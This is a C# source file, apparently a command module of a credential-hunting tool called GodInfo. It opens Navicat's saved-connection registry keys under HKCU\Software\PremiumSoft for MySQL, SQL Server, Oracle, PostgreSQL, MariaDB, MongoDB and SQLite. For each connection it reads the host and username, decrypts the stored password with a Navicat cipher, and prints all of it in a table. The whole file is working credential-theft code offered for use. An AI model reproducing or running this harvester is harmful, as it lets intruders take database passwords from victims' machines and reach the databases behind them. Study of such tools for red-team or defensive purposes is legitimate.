using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class NavicatCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string DatabaseType;
            public string ServerName;
            public string Host;
            public string Username;
            public string Password;
        }

        private const string RegistryPathBase = @"Software\PremiumSoft";

        private static readonly Dictionary<string, string> DatabaseTypes = new Dictionary<string, string>
        {
            { "Navicat", "MySql" },
            { "NavicatMSSQL", "SQL Server" },
            { "NavicatOra", "Oracle" },
            { "NavicatPG", "pgsql" },
            { "NavicatMARIADB", "MariaDB" },
            { "NavicatMONGODB", "MongoDB" },
            { "NavicatSQLite", "SQLite" }
        };

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by Navicat.");
            GetNavicatCred();
        }

        public static void GetNavicatCred()
        {
            Logger.TaskHeader("Hunting Navicat", 1);

            if (!CheckNavicatCredExists())
            {
                Logger.WriteLine("[-] No Navicat installation or saved connections found.");
                return;
            }

            // 从注册表获取Navicat凭据
            GetCredentialsFromRegistry();
        }

        public static bool CheckNavicatCredExists()
        {
            // 检查注册表中是否存在Navicat凭据
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(RegistryPathBase))
            {
                if (registryKey == null)
                {
                    return false;
                }

                // 检查是否有任何Navicat相关的子键
                foreach (string key in DatabaseTypes.Keys)
                {
                    using (RegistryKey navicatKey = Registry.CurrentUser.OpenSubKey($@"{RegistryPathBase}\{key}\Servers"))
                    {
                        if (navicatKey != null && navicatKey.GetSubKeyNames().Length > 0)
                        {
                            return true;
                        }
                    }
                }

                return false;
            }
        }

        private static void GetCredentialsFromRegistry()
        {
            Navicat11Cipher decrypter = new Navicat11Cipher();
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            bool foundAnyCredentials = false;

            foreach (var dbTypeEntry in DatabaseTypes)
            {
                string navicatType = dbTypeEntry.Key;
                string dbTypeName = dbTypeEntry.Value;

                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey($@"{RegistryPathBase}\{navicatType}\Servers"))
                {
                    if (registryKey == null) continue;

                    Logger.WriteLine($"[+] Found Navicat {dbTypeName} registry key");

                    foreach (string serverName in registryKey.GetSubKeyNames())
                    {
                        using (RegistryKey serverKey = registryKey.OpenSubKey(serverName))
                        {
                            if (serverKey == null) continue;

                            try
                            {
                                string host = serverKey.GetValue("Host", "").ToString();
                                string username = serverKey.GetValue("UserName", "").ToString();
                                string encryptedPassword = serverKey.GetValue("Pwd", "").ToString();

                                if (string.IsNullOrEmpty(encryptedPassword)) continue;

                                string decryptedPassword = decrypter.DecryptString(encryptedPassword);

                                connections.Add(new ConnectionInfo
                                {
                                    DatabaseType = dbTypeName,
                                    ServerName = serverName,
                                    Host = host,
                                    Username = username,
                                    Password = decryptedPassword
                                });

                                foundAnyCredentials = true;
                            }
                            catch (Exception ex)
                            {
                                Logger.WriteLine($"[-] Error processing Navicat {dbTypeName} server '{serverName}': {ex.Message}");
                            }
                        }
                    }
                }
            }

            if (foundAnyCredentials)
            {
                Logger.WriteLine($"\n[+] Found {connections.Count} Navicat connection(s):");
                Logger.PrintTableFromStructs(connections);
            }
            else
            {
                Logger.WriteLine("[-] No saved Navicat credentials found.");
            }
        }
    }
} 